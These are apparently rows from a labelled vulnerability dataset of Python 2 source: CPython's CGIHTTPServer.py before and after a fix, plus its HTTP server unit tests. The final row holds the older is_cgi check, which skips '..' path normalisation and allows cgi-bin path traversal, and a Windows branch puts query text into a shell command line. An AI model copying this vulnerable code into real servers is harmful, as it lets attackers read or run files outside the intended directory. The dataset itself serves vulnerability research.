    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
2,902b59452c3b1c879f3196fd90226a58e2fd074a,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
3,902b59452c3b1c879f3196fd90226a58e2fd074a,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
